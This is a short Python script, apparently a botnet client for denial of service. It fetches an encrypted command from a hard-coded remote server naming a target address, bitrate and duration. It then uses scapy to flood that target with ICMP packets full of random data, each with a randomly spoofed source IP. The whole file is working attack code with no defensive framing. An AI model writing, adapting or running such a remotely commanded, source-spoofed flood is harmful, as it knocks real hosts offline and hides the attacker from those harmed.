from random import randint
from cryptography.fernet import Fernet
import socket
from scapy.all import *
import time

#Récupération de la clé symétrique
with open("secret.key", "rb") as key_file:
    key=key_file.read()
fernet = Fernet(key)

client_socket = socket.socket()
host = "137.194.143.14"
port = 8081
print('Waiting for connection response')


try:
    client_socket.connect((host, port))
except socket.error as e:
    print(str(e))

res = client_socket.recv(1024)
decrypted_data=fernet.decrypt(res).decode('utf-8')
print(res, decrypted_data)
"""while True:
    Input = input('Hey there: ')
    client_socket.send(str.encode(Input))
    res = client_socket.recv(1024)
    print(res.decode('utf-8'))"""
client_socket.close()


bitrate = float(decrypted_data.split(" ")[1])
wait_time = 0.001
packet_size = min(int(bitrate*(10**6)*wait_time), 65503)
print(packet_size)
time_length = int(decrypted_data.split(" ")[2])

target = decrypted_data.split(" ")[0]
packet = IP(dst=target)/ICMP()/Raw(RandString(packet_size))
packet[IP].src = ".".join(map(str, (randint(0, 255)for _ in range(4))))

count = 0

start_time = time.time()

while time.time()-start_time < time_length: 
    count += 1
    send(packet)
    time.sleep(wait_time)

print(count*packet_size/(time.time()-start_time))